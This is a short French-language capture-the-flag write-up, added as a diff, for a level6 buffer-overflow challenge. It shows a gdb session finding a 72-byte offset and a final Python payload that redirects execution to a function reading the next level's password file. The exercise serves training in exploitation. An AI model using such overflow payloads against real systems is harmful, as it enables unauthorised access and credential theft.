@@ -1,0 +1,36 @@
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+
+m() useless
+n() pas appele mais execue un system() qui prend en arg: "/bin/cat /home/user/level7/.pass", on veut pouvoir y acceder
+un strcpy dans main qui copie argv[1] dans une adresse, on va l abuse
+
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41346341 in ?? ()
+(gdb) i r
+eax            0x41346341	1093952321
+ecx            0xbffff830	-1073743824
+edx            0x804a0ce	134521038
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff54c	0xbffff54c
+ebp            0xbffff578	0xbffff578
+esi            0x0	0
+edi            0x0	0
+eip            0x41346341	0x41346341
+eflags         0x210202	[ IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+Overflow a 72 ET eip est remplace par notre payload, on peut directement donner une adresse d une fonction qu on voudrait appeler
+
+on veut donc appeler n()
+
+./level6 $(python -c "print 'A'*72 + '\x08\x04\x84\x54'[::-1]")
